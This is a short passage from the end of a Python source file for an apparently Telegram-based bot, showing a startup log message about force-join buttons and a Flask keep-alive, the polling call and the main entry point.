    logger.info("🤖 Bot started – with Force Join buttons and Flask keep-alive.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()